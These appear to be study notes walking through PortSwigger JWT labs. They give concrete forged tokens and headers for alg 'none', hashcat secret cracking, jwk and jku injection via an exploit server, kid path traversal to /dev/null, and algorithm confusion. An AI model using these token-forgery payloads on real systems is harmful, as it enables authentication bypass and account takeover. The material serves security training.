# JWT Attacks
## What are JWTs
JSON web tokens (JWTs) are a standardized format for sending cryptographically signed JSON data between systems. Unlike with classic session tokens, all of the data that a server needs is stored client-side within the JWT itself.

A JWT consists of 3 parts: a header, a payload, and a signature, each separated by a dot:
- The header and payload parts of a JWT are just base64url-encoded JSON objects. The header contains metadata about the token itself, while the payload contains the actual "claims" about the user.
- The server that issues the token typically generates the signature by hashing the header and payload.

## JWT vs JWS vs JWE
The JWT specification is actually very limited. It only defines a format for representing information ("claims") as a JSON object that can be transferred between two parties. In practice, JWTs aren't really used as a standalone entity. The JWT spec is extended by both the JSON Web Signature (JWS) and JSON Web Encryption (JWE) specifications.

In other words, a JWT is usually either a JWS or JWE token. When people use the term "JWT", they almost always mean a JWS token. JWEs are very similar, except that the actual contents of the token are encrypted rather than just encoded.

According to the JWS specification, only the `alg` header parameter is mandatory. In practice, however, JWT headers (also known as JOSE headers) often contain several other parameters. The following ones are of particular interest to attackers.

- `jwk` (JSON Web Key) - Provides an embedded JSON object representing the key.
- `jku` (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.
- `kid` (Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching kid parameter.

### LAB: JWT authentication bypass via unverified signature
Send the `GET /my-account HTTP/2` to the `Repeater`. Click on `JSON Web Token` tab and modify the payload to:

    {
        "iss": "portswigger",
        "exp": 1742739812,
        "sub": "administrator"
    }

Click on `Sign` to create a new valid signature (make sure to create a new symmetric key in `JWT Editor` before signing). Send the request to successfully access the admin panel and delete user Carlos.

### LAB: JWT authentication bypass via flawed signature verification
Send the `GET /my-account HTTP/2` to the `Repeater`. Click on `JSON Web Token` tab and modify the payload to:

    {
        "iss": "portswigger",
        "exp": 1742739812,
        "sub": "administrator"
    }

Modify the header to tell the server not to use any hash algorithm:

    {
        "alg": "none"
    }

Send the request to successfully access the admin panel and delete user Carlos.

### LAB: JWT authentication bypass via weak signing key
Send the `GET /my-account HTTP/2` to the `Repeater`. Click on `JSON Web Token` tab and modify the payload to:

    {
        "iss": "portswigger",
        "exp": 1742739812,
        "sub": "administrator"
    }

Copy the session cookie (the JWT) and run this command to bruteforce for the secret:

    hashcat -a 0 -m 16500 eyJraWQiOiJiOGU2Y2UzZi01OWI2LTQzNGUtYTg4My1iYTc0YTEyNDk3YjYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0Mjc0MTYwMCwic3ViIjoid2llbmVyIn0.fO1MrmjDofVtNb304c9po31heEOdwFiprb4ZySAIAOc jwt.secrets.list

> **Note:**
> - -a 0: Straight attack mode
> - 16500: JWT hash type
> - jwt.secrets.list: list of secrets to bruteforce

Notice the result:

    eyJraWQiOiJiOGU2Y2UzZi01OWI2LTQzNGUtYTg4My1iYTc0YTEyNDk3YjYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0Mjc0MTYwMCwic3ViIjoid2llbmVyIn0.fO1MrmjDofVtNb304c9po31heEOdwFiprb4ZySAIAOc:secret1

This indicates that the secret is `secret1`. Now go to the `JWT Editor` $\to$ `New Symmetric Key` $\to$ `Specify secret: secret1` $\to$ `ID: b8e6ce3f-59b6-434e-a883-ba74a12497b6` (same ID as specified in the header). Use this newly generated key to sign the header and the modified payload. Send the request containing the new JWT and successfully access the admin panel to delete user Carlos.

### LAB: JWT authentication bypass via jwk header injection
The server supports the `jwk` parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source.
To make use of that, create a new RSA key in the `JWT Editor` tab. Send the `GET /my-account HTTP/2` to the `Repeater` $\to$ go to the `JSON Web Token` tab and modify the payload to:

    {
        "iss": "portswigger",
        "exp": 1742743329,
        "sub": "administrator"
    }

Now click on `Attack` $\to$ `Embedded JWK` and select the newly generated RSA key. Send the request using this new JWT and successfully access the admin panel to delete user Carlos.

### LAB: JWT authentication bypass via jku header injection
The server supports the `jku` parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.
To make use of that, create a new RSA key in the `JWT Editor` tab. Send the `GET /my-account HTTP/2` to the `Repeater` $\to$ go to the `JSON Web Token` tab and modify the payload to:

    {
        "iss": "portswigger",
        "exp": 1742743329,
        "sub": "administrator"
    }

Modify the header to point the `jku` value to our exploit server and sign the header and payload using our newly generate key:

    {
        "kid": "d2881e39-9887-43c4-9a7d-ea54c3b09777",
        "alg": "RS256",
        "jku": "https://exploit-0ad00030044fb3ad82a42d6801660070.exploit-server.net/exploit"
    }

At the `JWT Editor` tab, select our newly generate key and select `Copy public key as JWK`. Go to our exploit server, change the `Content-type` to `application/json` and paste the copied key in the format like this to the body:

    {
        "keys": [
            {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d2881e39-9887-43c4-9a7d-ea54c3b09777",
            "n": "tEQtN9cR9N_2YIc9nSfaTV8Lh6-BGns1P508aEZnOcEWAhZEFg3t5oDjPhppwh3iizBmOTr_Zsnn5EShznzNiyTUjRdB98vVa02xAQU-15MY65XiJSrtszeJhDnb7wlKg4KSfGd5t8M62qpHs2YwXAPUAYnIkki0W2TCTtQaAGcIOBzI-5f7GUsbKCfnTeTyb66Dfv4YsXlY0vmEgPHfAKrqRt1796FUJkCQyDel0gz8wX4Y3BAAV0mnCzR_kErwNtZmtWZdj6dcEVL3b5X9tjXXLOF3DzNpIbwVfoMMzTeWj_vdvjTIAfwdZsz4D8CR_uuCt5Mv8jZNxqWTZOc-PQ"
            }
        ]
    }

Now send the request to access the admin panel and successfully delete Carlos.

### LAB: JWT authentication bypass via kid header path traversal
The server uses the kid parameter in JWT header to fetch the relevant key from its filesystem. Make use of that, use path traversal in the `kid` value to specify a null secret. At the same time, generate a symmetric key in the `JWT Editor` also using a null secret (leaving the `Specify secret` blank) and sign this header and payload:

    Header:
    {
        "kid": "/../../../dev/null",
        "alg": "HS256"
    }

    Payload:
    {
        "iss": "portswigger",
        "exp": 1742745730,
        "sub": "administrator"
    }

Use this new JWT to access the admin panel and delete Carlos.

## Algorithm confusion attacks
Algorithm confusion attacks (also known as key confusion attacks) occur when an attacker is able to force the server to verify the signature of a JSON web token (JWT) using a different algorithm than is intended by the website's developers. If this case isn't handled properly, this may enable attackers to forge valid JWTs containing arbitrary values without needing to know the server's secret signing key.

> **E.g.** When the algorithm is using asymmetric key (RSA), the server signs the JWT using a private key, then the related public key (it's a public-private keypair) will be used to verify the signature. When the algorithm is symmetric (HS256) there's only one key, which is used to both sign and verify. If we can trick the server into using HS256 alg instead of RS256 and sign the token with the public key (assuming we can find it), the server will use that same public key to verify, allowing us to forge tokens

**Performing an algorithm confusion attack**
1. Obtain the server's public key
2. Convert the public key to a suitable format
3. Create a malicious JWT with a modified payload and the alg header set to HS256.
4. Sign the token with HS256, using the public key as the secret.

### LAB: JWT authentication bypass via algorithm confusion
Found the public key at `/jwks.json`:

    {"keys":[{"kty":"RSA","e":"AQAB","use":"sig","kid":"a15b340b-2abc-4ae1-9faf-de7228445866","alg":"RS256","n":"4iSEQPAf440Nhms2Bu_JyAJdzNYXBskQHxb9z6qHWKZtOIvevvGPTxp-ahl2jiw-Tf87kXHqpDawuoCZFHgYbA_vFc4ihe5qd4lGCdeCthvKdGcHObTXbJR5FNJSvDYeba62rccVz_p7jxMQSNzwPIjqOxgAeOYZzHXa1CQIox0kx1kMYfWgRK2BDEADPaWk26M7HfJKzWYIGguEHiPAj5wnrUn0ulqdRyCJwZkrhy4s6KEmI_FP8eJXi7cccQGsQqQlQwWwFJqxr3inJWpcJvZzS1sKw7NV7VcwHH52TyGtd7SxrTA_7nu4DeWZUARAQEqLwL1Z_JFA5m5qc7RULQ"}]}

Copy the key value, go to the `JWK Editor` tab $\to$ `New RSA Key` $\to$ paste in the key value (not formatted) $\to$ click on the `PEM` radio button to convert it to PEM format:

    -----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4iSEQPAf440Nhms2Bu/J
    yAJdzNYXBskQHxb9z6qHWKZtOIvevvGPTxp+ahl2jiw+Tf87kXHqpDawuoCZFHgY
    bA/vFc4ihe5qd4lGCdeCthvKdGcHObTXbJR5FNJSvDYeba62rccVz/p7jxMQSNzw
    PIjqOxgAeOYZzHXa1CQIox0kx1kMYfWgRK2BDEADPaWk26M7HfJKzWYIGguEHiPA
    j5wnrUn0ulqdRyCJwZkrhy4s6KEmI/FP8eJXi7cccQGsQqQlQwWwFJqxr3inJWpc
    JvZzS1sKw7NV7VcwHH52TyGtd7SxrTA/7nu4DeWZUARAQEqLwL1Z/JFA5m5qc7RU
    LQIDAQAB
    -----END PUBLIC KEY-----

Base64 encode this value in the `Decoder` tab:

    LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE0aVNFUVBBZjQ0ME5obXMyQnUvSgp5QUpkek5ZWEJza1FIeGI5ejZxSFdLWnRPSXZldnZHUFR4cCthaGwyaml3K1RmODdrWEhxcERhd3VvQ1pGSGdZCmJBL3ZGYzRpaGU1cWQ0bEdDZGVDdGh2S2RHY0hPYlRYYkpSNUZOSlN2RFllYmE2MnJjY1Z6L3A3anhNUVNOencKUElqcU94Z0FlT1laekhYYTFDUUlveDBreDFrTVlmV2dSSzJCREVBRFBhV2syNk03SGZKS3pXWUlHZ3VFSGlQQQpqNXduclVuMHVscWRSeUNKd1prcmh5NHM2S0VtSS9GUDhlSlhpN2NjY1FHc1FxUWxRd1d3RkpxeHIzaW5KV3BjCkp2WnpTMXNLdzdOVjdWY3dISDUyVHlHdGQ3U3hyVEEvN251NERlV1pVQVJBUUVxTHdMMVovSkZBNW01cWM3UlUKTFFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==

Now generate a new symmetric key and paste Base64 encoded key in the `k` value:

    {
        "kty": "oct",
        "kid": "c617e9ab-147b-4489-8042-ac19c16672cb",
        "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE0aVNFUVBBZjQ0ME5obXMyQnUvSgp5QUpkek5ZWEJza1FIeGI5ejZxSFdLWnRPSXZldnZHUFR4cCthaGwyaml3K1RmODdrWEhxcERhd3VvQ1pGSGdZCmJBL3ZGYzRpaGU1cWQ0bEdDZGVDdGh2S2RHY0hPYlRYYkpSNUZOSlN2RFllYmE2MnJjY1Z6L3A3anhNUVNOencKUElqcU94Z0FlT1laekhYYTFDUUlveDBreDFrTVlmV2dSSzJCREVBRFBhV2syNk03SGZKS3pXWUlHZ3VFSGlQQQpqNXduclVuMHVscWRSeUNKd1prcmh5NHM2S0VtSS9GUDhlSlhpN2NjY1FHc1FxUWxRd1d3RkpxeHIzaW5KV3BjCkp2WnpTMXNLdzdOVjdWY3dISDUyVHlHdGQ3U3hyVEEvN251NERlV1pVQVJBUUVxTHdMMVovSkZBNW01cWM3UlUKTFFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="
    }

Send the `GET /my-account HTTP/2` to the `Repeater` $\to$ go to the `JSON Web Token` tab and modify the payload to:

    {
        "iss": "portswigger",
        "exp": 1742743329,
        "sub": "administrator"
    }

Modify the header to use the HS256 algorithm:

    {
        "kid": "d2881e39-9887-43c4-9a7d-ea54c3b09777",
        "alg": "HS256"
    }

Resign the header and payload using our key and send the request. Now we successfully access the admin panel and delete Carlos.

### LAB: JWT authentication bypass via algorithm confusion with no exposed key
Sign in using the given credentials, take note of the JWT. Logout and sign in again to obtain another JWT. Now run this command:

    docker run --rm -it portswigger/sig2n <token1> <token2>

Notice the result:

    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwVDhCc2x2TWx5TmsyUUpVb2dTdQo5dDdQRFh6dHJNM09uenRLcHRPQ2xwdTRXYVJyai96Ymh1QVhreGJIUVlyeHFlRDNJL1E0OFk1RzRUdW4ySE45CnR3eklTYWUxQWhlNGJKL1RZSkRodE0yV0Q3TFF0L2JrZ21JcTltb1ovYW5Lc2xnSFRFTzduVlVjUFdZTnkyZGkKVkhrc01oUjZUOEcrZEVqU3IyOUtncGEyQ0JxTmF6b01SV01BYjVMRGxHZVVFM0F1SXhpbVdBNTI5ampHS2hQVQp1MGV2Vnowc3pBWjdkYTJJZVZnZlg3bTFFUndiWE54MVd6enhkU1pPSUZwVVJMRHNKRU96bmxtUS9vY0JkQ0RRClgxN3Yya0llait6eDQ2K3M3L2F0RitORm0yc3NjSUFKNHpnYlk3aTlNZ2RlY2wyN1RRNVVzdkk2U1Mrc2xPdSsKK3dJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJraWQiOiJmODc0M2VlZi1iZjkyLTQ1ODAtYTU1NC1hMjA4ZmI4NDMyOWIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc0Mjg3NTg3NywgInN1YiI6ICJ3aWVuZXIifQ.9pvers9B88uFupKD7-E9LQaumTjPYEVgi1qjOht4YjA

Test the `Tampered JWT` by sending `GET /my-account HTTP/2` with that token as the cookie. Notice we receive a `200 OK` response, which indicates a valid JWT. Now generate a new symmectric key using the value of `Base64 encoded x509 key` as the value of `k`:

    {
        "kty": "oct",
        "kid": "747a51a0-3905-4f10-9bb6-4c6c4ad08a2d",
        "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwVDhCc2x2TWx5TmsyUUpVb2dTdQo5dDdQRFh6dHJNM09uenRLcHRPQ2xwdTRXYVJyai96Ymh1QVhreGJIUVlyeHFlRDNJL1E0OFk1RzRUdW4ySE45CnR3eklTYWUxQWhlNGJKL1RZSkRodE0yV0Q3TFF0L2JrZ21JcTltb1ovYW5Lc2xnSFRFTzduVlVjUFdZTnkyZGkKVkhrc01oUjZUOEcrZEVqU3IyOUtncGEyQ0JxTmF6b01SV01BYjVMRGxHZVVFM0F1SXhpbVdBNTI5ampHS2hQVQp1MGV2Vnowc3pBWjdkYTJJZVZnZlg3bTFFUndiWE54MVd6enhkU1pPSUZwVVJMRHNKRU96bmxtUS9vY0JkQ0RRClgxN3Yya0llait6eDQ2K3M3L2F0RitORm0yc3NjSUFKNHpnYlk3aTlNZ2RlY2wyN1RRNVVzdkk2U1Mrc2xPdSsKK3dJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="
    }

Send the `GET /my-account HTTP/2` to the `Repeater` $\to$ go to the `JSON Web Token` tab and modify the payload to:

    {
        "iss": "portswigger",
        "exp": 1742743329,
        "sub": "administrator"
    }

Modify the header to use the HS256 algorithm:

    {
        "kid": "d2881e39-9887-43c4-9a7d-ea54c3b09777",
        "alg": "HS256"
    }

Resign the header and payload using our key and send the request. Now we successfully access the admin panel and delete Carlos.